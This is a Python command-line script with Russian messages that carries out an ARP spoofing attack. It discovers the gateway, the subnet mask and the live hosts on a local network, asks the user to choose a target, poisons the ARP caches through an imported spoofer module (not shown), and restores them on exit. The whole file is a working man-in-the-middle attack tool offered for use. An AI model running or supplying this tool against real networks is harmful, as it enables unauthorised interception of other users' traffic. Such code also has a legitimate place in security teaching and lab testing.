from spoofer import *
from enum import Enum
import argparse


class Errors(Enum):
    NO_IFACE = 1
    NO_GATEWAY = 2
    NO_MASK = 3
    NO_HOST = 4
    INCORRECT_IFACE = 5


def error_proc(err):
    if err == Errors.NO_IFACE:
        print('Нет доступных интерфейсов')

    elif err == Errors.NO_GATEWAY:
        print('Невозможно определить адрес шлюза. '
              'Попробуйте увеличить время ожидания ответа (-t)')

    elif err == Errors.NO_MASK:
        print('Невозможно определить маску подсети '
              'Попробуйте увеличить время ожидания ответа (-t)')

    elif err == Errors.NO_HOST:
        print('Активных узлов в сети не обнаружено '
              'Попробуйте увеличить время ожидания ответа (-t)')

    elif err == Errors.INCORRECT_IFACE:
        print('Интерфейс задан некорректно')

    exit()


def parse():
    parser = argparse.ArgumentParser(description='Проведение атаки ARP spoofing')
    parser.add_argument('-i', '--iface',
                        type=str,
                        help='интерфейс для прослушивания')
    parser.add_argument('-t', '--timeout',
                        type=int,
                        default=10,
                        help='время ожидания ответа')
    args = parser.parse_args()

    return args.iface, args.timeout


def get_target(hosts):
    hosts_nums = [str(x) for x in range(0, len(hosts) + 1)]

    inp = input('Введите номер цели > ')
    while inp not in hosts_nums:
        print('Неверный номер!', end=' ')
        inp = input(f'Введите целое число в промежутке [{hosts_nums[0]}, {hosts_nums[-1]}] '
                    f'(0 для выхода) > ')
    inp = int(inp)

    if inp == 0:
        exit()

    return hosts[inp - 1]


if __name__ == '__main__':
    # Парсинг аргументов
    iface, timeout = parse()

    # Отключение стандартного вывода библиотеки
    conf.verb = 0

    # Проверка наличия интерфейсов
    ifs = get_ifaces()
    if not ifs:
        error_proc(Errors.NO_IFACE)

    if iface and (iface not in ifs):
        error_proc(Errors.INCORRECT_IFACE)

    # Получение нформации о сети и активных узлах
    spoofer = Spoofer(iface, timeout)

    print('\nПолучение адреса шлюза')
    gateway = spoofer.get_gateway()
    if not gateway:
        error_proc(Errors.NO_GATEWAY)
    print(f'Шлюз: {gateway}\n', end='\n')

    print('Получение маски подсети')
    classic_mask, dec_mask = spoofer.get_mask()
    if not classic_mask:
        error_proc(Errors.NO_MASK)
    print(f'Маска: {classic_mask}\n')

    print('Обнаружение активных узлов')
    hosts = spoofer.get_alive_hosts(dec_mask, gateway)
    if not hosts:
        error_proc(Errors.NO_HOST)

    for i, host in enumerate(hosts):
        print(f'{i + 1}. Обнаружен активный узел: {host}')

    # Определение цели и проведение атаки
    target = get_target(hosts)

    try:
        print('\nОтравление ARP кэша запущено')
        spoofer.poison(target, gateway)

    except KeyboardInterrupt:
        print('\nОстановка атаки')

    except Exception as e:
        warning(f'Получена неизвестная ошибка: {e}')

    finally:
        print('Восстановление ARP кэша')
        spoofer.restore(target, gateway)
